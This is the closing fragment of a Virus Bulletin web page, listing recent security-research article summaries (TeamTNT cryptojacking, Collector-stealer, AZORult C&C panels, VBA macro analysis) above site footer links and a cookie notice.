alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>